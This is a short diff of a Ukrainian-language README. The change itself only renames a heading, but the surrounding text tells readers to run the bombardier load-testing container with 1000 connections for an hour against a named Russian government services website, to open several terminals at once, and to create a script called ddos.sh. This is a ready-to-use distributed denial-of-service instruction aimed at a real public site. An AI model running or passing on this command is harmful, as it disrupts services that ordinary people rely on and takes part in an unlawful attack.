@@ -22,7 +22,8 @@ docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://www.gosuslugi.
 ```
 (замініть `https://www.gosuslugi.ru` на необхідний сайт)  
 **Ви можете відкрити декілька вікон терміналу**  
-5. ДОДАТКОВО  
+
+## Доповнення  
 Можете створити файл `ddos.sh` та контентом:
 ```
 #!/bin/bash -x
